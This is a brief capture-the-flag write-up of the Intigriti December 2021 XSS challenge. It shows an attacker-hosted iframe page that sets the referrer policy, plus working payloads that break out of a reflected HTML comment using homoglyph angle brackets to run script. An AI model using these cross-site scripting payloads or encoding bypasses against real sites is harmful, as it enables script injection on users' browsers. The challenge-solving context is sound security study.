link: https://challenge-1221.intigriti.io/challenge/index.php?payload=
Author: https://twitter.com/E1u5iv3F0x

+ In the payload field, when I first gave <h1>test</h1>
![image](https://github.com/av4nth1ka/Intigriti-XSS-challenges/assets/80388135/02224fbb-8518-4b9d-b447-7252845cac79)
+ When I submitted the same payload for the second time,
![image](https://github.com/av4nth1ka/Intigriti-XSS-challenges/assets/80388135/b36187ef-853c-40a6-96ed-1de0c72c2099)
+ The referer html comment: The Referer HTTP request header contains an absolute or partial address of the page that makes
the request. The Referer header allows a server to identify a page where people are visiting it from.
+ The idea is following: We as “attacker” setup a webserver with a webpage that redirects the
“victim” visiting our webpage to the challenge page. The referer comment should then show our
webpage.
+ I created my own page with the following contents
```
<html>
<head>
<meta name="referer" content="unsafe-url">
</head>
<body>
<iframe src="https://challenge-1221.intigriti.io/challenge/index.php?payload=">
</body>
</html>
```
+ create a python server and host it.
+ final payload: http://localhost/test.html?-->test<img src=test onerror=document.domain>
+ that still dont work  due to our < and > being encoded
+ https://www.irongeek.com/homoglyph-attack-generator.php
+ Homoglyphs are input “look a like” characters
FInal payload:  http://localhost/test.html? --＞＜script＞alert(document.domain)＜/script＞

# Reference:
https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy
